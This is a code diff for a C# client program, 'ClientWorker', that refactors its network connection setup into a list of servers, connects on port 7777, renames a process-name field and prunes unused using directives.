@@ -1,21 +1,16 @@
-﻿using System;
-using System.Data;
-using System.Data.SQLite;
+﻿using Service;
+using System;
+using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
-using System.Security.Principal;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using Interfaces;
-using Service;
 
 namespace ClientWorker
 {
-	internal class Program
+    internal class Program
 	{
-        public static Client netSender;
-        public static string nameProc;
+        public static List<Client> Servers = new List<Client>();
+        public static string NameProc;
         private static readonly ManualResetEventSlim _OnResponce = new ManualResetEventSlim(false);
         private static string downloadSource = "Name";
 
@@ -27,17 +22,17 @@ namespace ClientWorker
             if (args.Length > 0 ) downloadSource = args[0];
             OnProgramLoad();
 
-            netSender = new Client();
+            Client netSender = new Client();
             //netSender.Host = "localhost";
             netSender.Host = StartData.currentServer;
             netSender.Port = 7777;
             netSender.Events.OnError = OnError;
             netSender.Events.OnBark = OnBark;
             netSender.Connect(false);
+            Servers.Add(netSender);
 
             _OnResponce.Wait();
         }
-
 
         private static void OnBark(int obj)
         {
@@ -59,7 +54,7 @@ namespace ClientWorker
                 Environment.Exit(0);
             }            
 
-            nameProc = GetProcessName();
+            NameProc = GetProcessName();
             SetParametrsSetting();
             Functions.Registration();
             FtpClient.Init();
